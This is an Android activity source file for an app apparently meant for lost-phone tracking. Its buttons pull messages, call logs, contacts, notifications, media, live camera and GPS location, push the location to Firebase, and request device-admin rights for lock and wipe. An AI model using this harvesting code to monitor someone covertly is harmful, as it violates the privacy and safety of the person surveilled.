package com.hazyaz.temps;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;


import android.util.Log;
import android.view.View;

import android.widget.Button;
import android.widget.Toast;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.hazyaz.temps.CallLogs.GetCallLogs;
import com.hazyaz.temps.Contacts.Contacts;
import com.hazyaz.temps.GPS.GPSTracker;
import com.hazyaz.temps.Media.CameraImage;
import com.hazyaz.temps.Media.CameraVideo;
import com.hazyaz.temps.Message.MessageReceiver;
import com.hazyaz.temps.Storage.GetImages;


public class MainActivity extends AppCompatActivity {

    private static final int APP_PERMISSION_REQUEST = 1;
    private static final String TAG = "Recorder";
    public static Context context;
    public final String[] EXTERNAL_PERMS = {Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE
            , Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.ACCESS_BACKGROUND_LOCATION
            , Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.CAMERA, Manifest.permission.BIND_DEVICE_ADMIN
    };
    ComponentName mDeviceAdminSample;
    DevicePolicyManager mDPM;
    public final int EXTERNAL_REQUEST = 138;
    private FirebaseAuth mAuth;
    public Button folder_whatsapp, folder_camera, folder_screenshots, folder_downloads, s_notification, s_calllogs,
            s_contacts, s_messages, live_location, live_screenshots, live_camera, live_mic, live_video, Admin, Change_password;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        FirebaseApp.initializeApp(MainActivity.this);

        mAuth = FirebaseAuth.getInstance();

        context = getApplicationContext();
        requestForPermission();


        mDeviceAdminSample = new ComponentName(this, DeviceAdminControl.class);
        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

        AssignButton();

//        Retrieves images of screenshot, dcim, downloads and camera
        folder_whatsapp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                GetImages obj = new GetImages();
                obj.getWhatsAppImages();
                Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
            }
        });
        folder_camera.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                GetImages obj = new GetImages();
                obj.getCameraImages();
                Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
            }
        });
        folder_screenshots.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                GetImages obj = new GetImages();
                obj.getScreenshots();
                Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
            }
        });
        folder_downloads.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                GetImages obj = new GetImages();
                obj.getDownloads();
                Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
            }
        });


//        Retrieves all the notification of the devices
        s_notification.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showPermissionDialog();
                Toast.makeText(getApplicationContext(), "Notification Sent Successfully", Toast.LENGTH_LONG).show();
            }
        });

//      Retrieves all the call logs
        s_calllogs.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                GetCallLogs getCallLogs = new GetCallLogs();
                String callrec = getCallLogs.getCallDetails(getApplicationContext());
                Log.d("call logs", callrec);
                Toast.makeText(getApplicationContext(), "Calllogs sent successfully", Toast.LENGTH_LONG).show();
            }
        });

//      Retrieved All the Messages
        s_messages.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void onClick(View v) {
                MessageReceiver messageReceiver = new MessageReceiver();
                String messages = messageReceiver.getAllSms(getApplicationContext());
                Log.d("messages ", messages);
                Toast.makeText(getApplicationContext(), "Messages sent successfully", Toast.LENGTH_LONG).show();
            }
        });


//       Retrieves all the contacts
        s_contacts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Contacts contacts = new Contacts();
                contacts.getContactList(getContentResolver());
                Toast.makeText(getApplicationContext(), "Contact sent successfully", Toast.LENGTH_LONG).show();
            }
        });

//      Retrieves location of the device
        live_location.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                GPSTracker gpsTracker = new GPSTracker(getApplicationContext());
                Log.d("loasdsd", "" + gpsTracker.getLatitude()+" " +gpsTracker.getLongitude());
                DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();

                mDatabase.child("users").child("username").child("Location").child("Longitude").setValue(gpsTracker.getLongitude());
                mDatabase.child("users").child("username").child("Location").child("Latitude").setValue(gpsTracker.getLatitude());
                mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Live").child("Location").child("Longitude").setValue(gpsTracker.getLongitude());
                mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Live").child("Location").child("Latitude").setValue(gpsTracker.getLatitude());

                Toast.makeText(getApplicationContext(), "Live Location sent successfully", Toast.LENGTH_LONG).show();
            }
        });

//      Takes live camera photo
       live_camera.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(new Intent(MainActivity.this, CameraImage.class));
                Toast.makeText(getApplicationContext(), "Live Camera sent successfully", Toast.LENGTH_LONG).show();
            }
        });

//      Takes live camera video
        live_video.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(MainActivity.this, CameraVideo.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startService(intent);
                finish();
                Toast.makeText(getApplicationContext(), "Live Video sent successfully", Toast.LENGTH_LONG).show();
            }
        });

//      Takes live screenshots
        live_screenshots.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(getApplicationContext(), "Live Screenshot sent successfully", Toast.LENGTH_LONG).show();

            }
        });


        Admin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (mDPM != null && mDPM.isAdminActive(mDeviceAdminSample)) {
                    Toast.makeText(getApplicationContext(), "Admin Active ", Toast.LENGTH_LONG).show();
                } else {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                            mDeviceAdminSample);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "You need to activate Device Administrator to perform phonelost tasks!");
                    startActivityForResult(intent, 45);
                }
//                mDPM.lockNow();
//                lock the device
//                mDPM.wipeData(0);
//                wipe the device
//                int maxFailedPw = 1;
//                mDPM.setMaximumFailedPasswordsForWipe(mDeviceAdminSample, maxFailedPw);
//                reset phone after 2 ettempts

            }

        });


//       Change device password
        Change_password.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mDPM.lockNow();
            }
        });


    }


    public void showPermissionDialog() {
        getApplicationContext().startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    @Override
    public void onStart() {
        super.onStart();
        FirebaseApp.initializeApp(MainActivity.this);

        mAuth = FirebaseAuth.getInstance();

        // Check if user is signed in (non-null) and update UI accordingly.
        FirebaseUser currentUser = mAuth.getCurrentUser();
        if (currentUser == null) {
            Intent t = new Intent(MainActivity.this, Login.class);
            startActivity(t);
        }
    }


    public boolean requestForPermission() {

        boolean isPermissionOn = true;
        final int version = Build.VERSION.SDK_INT;

        if (version >= 23) {

            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }

            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.BIND_DEVICE_ADMIN))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
        }

        return isPermissionOn;
    }


    public boolean canAccessExternalSd() {
        return (hasPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE));
    }

    private boolean hasPermission(String perm) {
        return (PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, perm));

    }


    void AssignButton(){
        folder_whatsapp = findViewById(R.id.folder_whatsapp);
        folder_camera = findViewById(R.id.folder_image);
        folder_screenshots = findViewById(R.id.folder_screenshot);
        folder_downloads = findViewById(R.id.folder_downloads);


        s_notification = findViewById(R.id.send_notification);
        s_calllogs = findViewById(R.id.send_calllogs);
        s_contacts = findViewById(R.id.send_contacts);
        s_messages = findViewById(R.id.send_messages);

        live_location = findViewById(R.id.live_location);
        live_screenshots = findViewById(R.id.live_screenshot);
        live_camera = findViewById(R.id.live_Camera);
        live_mic = findViewById(R.id.live_mic);
        live_video = findViewById(R.id.live_video);

        Admin = findViewById(R.id.enableAdmin);
        Change_password = findViewById(R.id.changePass);

    }



}
